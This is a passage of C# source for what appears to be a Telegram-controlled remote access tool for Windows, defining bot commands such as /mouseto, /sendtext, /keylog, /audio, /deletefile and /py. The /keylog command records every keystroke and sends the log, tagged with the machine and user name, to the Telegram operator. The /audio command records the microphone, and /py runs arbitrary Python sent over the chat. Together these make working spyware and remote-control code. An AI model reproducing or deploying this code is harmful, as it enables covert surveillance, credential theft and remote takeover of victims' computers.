                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
                                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                                        break;


                                    default:
                                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "No such usage for /window. Type /help window for info.", replyToMessageId: update.Message.MessageId);
                                        return;
                                }

                            }
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //MOVE MOUSE TO COORD
            CommandsList.Add(new BotCommand
            {
                Command = "/mouseto",
                CountArgs = 2,
                IgnoreCountArgs = false,
                MayHaveNoArgs = false,

                Description = "Move cursor to coordinate in pixels",
                Example = "/mouseto 200 300 (width heght)",

                Execute = (model, update) =>
                {
                    MouseSimulator mouseSimulator = new MouseSimulator(new InputSimulator());

                    try
                    {
                        mouseSimulator.MoveMouseTo(Convert.ToDouble(model.Args[0]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Width),
                            Convert.ToDouble(model.Args[1]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Height));
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);

                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //MOVE MOUSE BY PIXELS
            CommandsList.Add(new BotCommand
            {
                Command = "/mouseby",
                CountArgs = 2,
                IgnoreCountArgs = false,
                MayHaveNoArgs = false,
                Description = "Move cursor by pixels.",
                Example = "/mouseby 15 20",
                Execute = (model, update) =>
                {
                    MouseSimulator mouseSimulator = new MouseSimulator(new InputSimulator());
                    try
                    {
                        mouseSimulator.MoveMouseBy(Convert.ToInt32(model.Args[0]),
                            Convert.ToInt32(model.Args[1]));
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //CLICK LEFT MOUSE BUTTON
            CommandsList.Add(new BotCommand
            {
                Command = "/lmclick",
                Description = "Simulate left mouse click.",
                Execute = (model, update) =>
                {
                    new MouseSimulator(new InputSimulator()).LeftButtonClick();
                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                }
            });

            //DOUBLECLICK LEFT MOUSE BUTTON
            CommandsList.Add(new BotCommand
            {
                Command = "/dlmclick",
                Description = "Simulate double left mouse click.",
                Execute = (model, update) =>
                {
                    new MouseSimulator(new InputSimulator()).LeftButtonDoubleClick();
                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                }
            });

            //CLICK RIGHT MOUSE BUTTON
            CommandsList.Add(new BotCommand
            {
                Command = "/rmclick",
                Description = "Simulate right mouse click.",
                Execute = (model, update) =>
                {
                    new MouseSimulator(new InputSimulator()).RightButtonClick();
                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                }
            });

            //SEND TEXT INPUT
            CommandsList.Add(new BotCommand
            {
                Command = "/sendtext",
                IgnoreCountArgs = true,
                MayHaveNoArgs = false,
                Description = "Send text input",
                Example = "/sendtext hello world",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            new KeyboardSimulator(new InputSimulator()).TextEntry(model.RawArgs);
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //KEYLOG
            CommandsList.Add(new BotCommand
            {
                Command = "/keylog",

                Description = "Keylog starts and ends with no args.",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        if (keylog)
                        {
                            keylog = false;
                            return;
                        }
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Keylog started!", replyToMessageId: update.Message.MessageId);
                        keylog = true;

                        StringBuilder mappedKeys = new StringBuilder();
                        StringBuilder unmappedKeys = new StringBuilder();
                        List<uint> LastKeys = new List<uint>();
                        List<uint> shit = new List<uint>();
                        while (keylog)
                        {
                            shit.Clear();
                            bool hasAtLeastOneKey = false;
                            for (uint i = 0; i < 256; i++)
                            {
                                int state = WinAPI.GetAsyncKeyState(i);
                                if (state != 0)
                                {
                                    shit.Add(i);
                                    hasAtLeastOneKey = true;
                                }
                            }
                            if (!hasAtLeastOneKey && LastKeys.Count > 0)
                            {
                                char mappedKeycode = WinAPI.MapVirtualKey(LastKeys[0]);
                                for (int i = 0; i < LastKeys.Count; i++)
                                {
                                    mappedKeycode = WinAPI.MapVirtualKey(LastKeys[i]);
                                    if ((int)mappedKeycode == 0)
                                        mappedKeys.Append(LastKeys[i].ToString() + ";");
                                    else
                                        mappedKeys.Append(mappedKeycode + ";");

                                    unmappedKeys.Append(LastKeys[i].ToString("X") + ";");
                                }
                                mappedKeys.Append(" ");
                                unmappedKeys.Append(" ");
                                LastKeys.Clear();
                                continue;
                            }
                            foreach (uint v in shit)
                            {
                                if (!LastKeys.Contains(v))
                                {
                                    LastKeys.Add(v);
                                }
                            }

                        }
                        using (FileStream keylogFileStream = System.IO.File.Create("keylog.txt"))
                        {
                            StreamWriter streamWriter = new StreamWriter(keylogFileStream);
                            streamWriter.WriteLine("#Mapped keylog:");
                            streamWriter.WriteLine(mappedKeys.ToString());
                            streamWriter.WriteLine("\n#Remember, mapped keylog is not the \"clear\" input.\n\n#Unmapped keylog:");
                            streamWriter.WriteLine(unmappedKeys.ToString());
                            streamWriter.WriteLine("\n#Keycodes table - https://docs.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes");
                            streamWriter.Close();
                        }
                        Bot.SendTextMessageAsync(update.Message.From.Id, "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + mappedKeys.ToString());

                        using (FileStream fs = new FileStream("keylog.txt", FileMode.Open))
                        {
                            Bot.SendDocumentAsync(update.Message.From.Id, new InputOnlineFile(fs), caption: "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName).Wait();
                        }
                    });
                }
            });

            //RECORD AUDIO
            CommandsList.Add(new BotCommand
            {
                Command = "/audio",
                CountArgs = 1,
                Description = "Record audio from microphone for given amount of secs.",
                Example = "/audio 50",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (WaveIn.DeviceCount == 0)
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This machine has no audio input devices, the recording isn't possible.", replyToMessageId: update.Message.MessageId);
                                return;
                            }

                            uint recordLength;

                            if (uint.TryParse(model.Args[0], out recordLength) is false)
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Argument must be a positive integer!", replyToMessageId: update.Message.MessageId);
                                return;
                            }

                            WaveInEvent waveIn2 = new WaveInEvent();

                            waveIn2.WaveFormat = new WaveFormat(44100, 1);
                            MemoryStream memstrm = new MemoryStream();
                            WaveFileWriter waveFileWriter2 = new WaveFileWriter(memstrm, waveIn2.WaveFormat);

                            waveIn2.DataAvailable += new EventHandler<WaveInEventArgs>((sender, args) =>
                            {
                                if (waveFileWriter2 != null)
                                {
                                    waveFileWriter2.Write(args.Buffer, 0, args.BytesRecorded);
                                    waveFileWriter2.Flush();
                                }
                            });

                            waveIn2.StartRecording();
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Start recording", replyToMessageId: update.Message.MessageId);

                            Task.Delay((int)recordLength * 1000).Wait();

                            waveIn2.StopRecording();

                            memstrm.Position = 0;

                            Bot.SendAudioAsync(update.Message.Chat.Id, new InputOnlineFile(memstrm, fileName: "record"), replyToMessageId: update.Message.MessageId).Wait();

                            waveIn2.Dispose();
                            memstrm.Close();

                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }

                    });
                }
            });

            //GET ALL COMMANDS
            CommandsList.Add(new BotCommand
            {
                Command = "/commands",
                Description = "Get all commands list sorted by alphabet",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        StringBuilder commandsList = new StringBuilder("List of all commands:\n\n");
                        foreach (BotCommand command in commands.OrderBy(x => x.Command))
                        {
                            commandsList.AppendLine(command.Command);
                        }
                        commandsList.AppendLine("\nHold to copy command");
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, commandsList.ToString(), replyToMessageId: update.Message.MessageId);

                    });
                }
            });

            //DELETE FILE
            CommandsList.Add(new BotCommand
            {
                Command = "/deletefile",
                MayHaveNoArgs = false,
                Description = "Delete file in path",
                Example = "/deletefile hello world.txt",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (System.IO.File.Exists(model.RawArgs))
                            {
                                System.IO.File.Delete(model.RawArgs);
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist.", replyToMessageId: update.Message.MessageId);
                            }
                        }
                        catch (Exception e)
                        {
                            ReportError(update, e);
                        }
                    });
                }
            });

            //CREATE FOLDER
            CommandsList.Add(new BotCommand
            {
                Command = "/createfolder",
                MayHaveNoArgs = false,
                Description = "Create folder.",
                Example = "/createfolder C:\\Users\\User\\Documents\\NewFolder",
                Execute = async (model, update) =>
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (!Directory.Exists(model.RawArgs))
                            {
                                Directory.CreateDirectory(model.RawArgs);
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This folder already exists!", replyToMessageId: update.Message.MessageId);
                            }
                        }
                        catch (Exception e)
                        {
                            ReportError(update, e);
                        }
                    });
                }
            });

            //DELETE FOLDER
            CommandsList.Add(new BotCommand
            {
                Command = "/deletefolder",
                MayHaveNoArgs = false,
                Description = "Delete folder.",
                Example = "/deletefolder C:\\Users\\User\\Desktop\\My Folder",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (Directory.Exists(model.RawArgs))
                            {
                                Directory.Delete(model.RawArgs);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This folder does not exist!", replyToMessageId: update.Message.MessageId);
                            }
                        }
                        catch (Exception e)
                        {
                            ReportError(update, e);
                        }
                    });
                }
            });

            //RENAME FILE
            CommandsList.Add(new BotCommand
            {
                Command = "/renamefile",
                Description = "Rename file. First argument must be path (full or relative) for file. Second argument must contain only new name.",
                Example = "/renamefile \"C:\\Users\\User\\Documents\\Old Name.txt\" \"New Name.txt\"",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (System.IO.File.Exists(model.Args[0]) && !System.IO.File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
                            {
                                string fileToRename = Path.GetFullPath(model.Args[0]);
                                string newFileName = $"{Path.GetDirectoryName(fileToRename)}\\{model.Args[1]}";
                                System.IO.File.Move(fileToRename, newFileName);
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                            }
                            else
                            {
                                if (!System.IO.File.Exists(model.Args[0]))
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist!", replyToMessageId: update.Message.MessageId);
                                if (System.IO.File.Exists($"{Path.GetDirectoryName(model.Args[0])}\\{model.Args[1]}"))
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is a file with the same name!", replyToMessageId: update.Message.MessageId);
                            }
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //COPY FILE
            CommandsList.Add(new BotCommand
            {
                Command = "/copyfile",
                CountArgs = 2,
                Description = "Copy file. First argument is file path (full or realtive), second is folder path. Type paths as in cmd.",
                Example = "/copyfile \"My folder\\hello world.txt\" \"C:\\Users\\User\\Documents\\Some Folder\"",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (System.IO.File.Exists(model.Args[0]) && Directory.Exists(model.Args[1]))
                            {
                                System.IO.File.Copy(model.Args[0], $"{model.Args[1]}\\{Path.GetFileName(model.Args[1])}");
                            }
                            else
                            {
                                if (!System.IO.File.Exists(model.Args[0]))
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist!", replyToMessageId: update.Message.MessageId);
                                if (!Directory.Exists(model.Args[1]))
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This path does not exist!", replyToMessageId: update.Message.MessageId);
                            }
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //PYTHON COMMANDS EXECUTING
            CommandsList.Add(new BotCommand
            {
                Command = "/py",
                Description = "Execute python expression or file. To execute file attach it to message or send it and reply to it with command /py. Mind that all expressions and files execute in the same script scope. To clear scope /pyclearscope",
                Example = "/py print('Hello World')",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (update.Message.Type == MessageType.Document)
                            {
                                if (!update.Message.Document.FileName.Contains(".py"))
                                {
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This is not a python script!", replyToMessageId: update.Message.MessageId);
                                    return;
                                }
                                MemoryStream outputStream = new MemoryStream();
                                var scriptFileStream = System.IO.File.Create("UserScript.py");
                                pythonEngine.Runtime.IO.SetOutput(outputStream, Encoding.UTF8);

                                var file = Bot.GetFileAsync(update.Message.Document.FileId).Result;
                                Bot.DownloadFileAsync(file.FilePath, scriptFileStream).Wait();
                                scriptFileStream.Close();

                                pythonEngine.ExecuteFile("UserScript.py", pythonScope);

                                outputStream.Position = 0;

                                string outputText = string.Join(string.Empty, new StreamReader(outputStream).ReadToEnd().Take(4096));

                                if (outputText.Length > 0)
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output: {outputText}", replyToMessageId: update.Message.MessageId);
                                else
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed!", replyToMessageId: update.Message.MessageId);

                                System.IO.File.Delete("UserScript.py");
                                outputStream.Close();
                                return;
                            }
                            if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Document)
                            {
                                if (!update.Message.ReplyToMessage.Document.FileName.Contains(".py"))
                                {
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This is not a python script!", replyToMessageId: update.Message.MessageId);
                                    return;
                                }
                                MemoryStream outputStream = new MemoryStream();
                                var scriptFileStream = System.IO.File.Create("UserScript.py");
                                pythonEngine.Runtime.IO.SetOutput(outputStream, Encoding.UTF8);

                                var file = Bot.GetFileAsync(update.Message.ReplyToMessage.Document.FileId).Result;
                                Bot.DownloadFileAsync(file.FilePath, scriptFileStream).Wait();
                                scriptFileStream.Close();

                                pythonEngine.ExecuteFile("UserScript.py", pythonScope);

                                outputStream.Position = 0;

                                string outputText = string.Join(string.Empty, new StreamReader(outputStream).ReadToEnd().Take(4096));


                                if (outputText.Length > 0)
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output: {outputText}", replyToMessageId: update.Message.MessageId);
                                else
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed!", replyToMessageId: update.Message.MessageId);

                                System.IO.File.Delete("UserScript.py");
                                outputStream.Close();
                                return;
                            }


                            if (model.Args.Length < 1)
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Need an expression or file to execute", replyToMessageId: update.Message.MessageId);
                                return;
                            }
                            MemoryStream pyOutput = new MemoryStream();
                            var pyStream = new MemoryStream();
                            pythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);

                            pythonEngine.Execute(model.RawArgs, pythonScope);
                            pyStream.Position = 0;

                            if (pyStream.Length > 0)
                            {
                                string output = string.Join(string.Empty, new StreamReader(pyStream).ReadToEnd().Take(4096).ToArray());
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output:\n{output}", replyToMessageId: update.Message.MessageId);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Executed!", replyToMessageId: update.Message.MessageId);
                            }
                            pyStream.Close();

                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }

                    });
                }
            });

            //PYTHON CLEAR SCOPE
            CommandsList.Add(new BotCommand
            {
                Command = "/pyclearscope",
                CountArgs = 0,
                Description = "Clear python execution scope.",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        pythonScope = pythonEngine.CreateScope();
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Cleared!", replyToMessageId: update.Message.MessageId);
                    });
                }

            });

            //MONITOR OFF/ON
            CommandsList.Add(new BotCommand
            {
                Command = "/monitor",
                CountArgs = 1,

                Description = "Turn monitor off or on",
                Example = "/monitor off",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            switch (model.Args[0])
                            {
                                case "off":
                                    bool status = WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MONITORPOWER, 2);
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, status ? "Monitor turned off" : "Failed", replyToMessageId: update.Message.MessageId);
                                    break;

                                case "on":
                                    new MouseSimulator(new InputSimulator()).MoveMouseBy(0, 0);
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Monitor turned on", replyToMessageId: update.Message.MessageId);
                                    break;

                                default:
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Type off or on. See help - /help monitor", replyToMessageId: update.Message.MessageId); ;
                                    break;
                            }

                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //GET LOGICAL DRIVES
            CommandsList.Add(new BotCommand
            {
                Command = "/drives",
                CountArgs = 0,
                Description = "Show all logical drives on this computer.",
                Example = "/drives",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            DriveInfo[] drives = DriveInfo.GetDrives();
                            StringBuilder drivesStr = new StringBuilder();
                            foreach (DriveInfo drive in drives)
                            {
                                drivesStr.Append(
                                    $"Name: {drive.Name}\n" +
                                    $"IsReady: {drive.IsReady}\n");
                                if (drive.IsReady)
                                {
                                    drivesStr.Append(
                                    $"Label: {drive.VolumeLabel}\n" +
                                    $"Type: {drive.DriveType}\n" +
                                    $"Format: {drive.DriveFormat}\n\n");
                                }
                                else
                                {
                                    drivesStr.AppendLine();
                                }
                            }
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, string.Join(string.Empty, drivesStr.ToString().Take(4096).ToArray()), ParseMode.Html, replyToMessageId: update.Message.MessageId);
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }

                    });
                }
            });

            //PING 
            CommandsList.Add(new BotCommand
            {
                Command = "/ping",

                Description = "Ping bot to check if it's work",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Ping!", replyToMessageId: update.Message.MessageId); ;
                    });
                }
            });

            //REPEAT
            CommandsList.Add(new BotCommand
            {
                Command = "/repeat",

                Execute = (model, update) =>
                {
                    BotCommandModel newmodel = BotCommand.Parse(update.Message.ReplyToMessage.Text);

                    if (newmodel == null)
                    {
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Unable to repeat command from this message");
                    }

                    var cmd = CommandsList.Find(command => command.Command == newmodel.Command);

                    if (ValidateModel(cmd, newmodel))
                        cmd.Execute(newmodel, update);
                    else
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Unable to repeat command from this message");
                }
            });

        }
    }
}
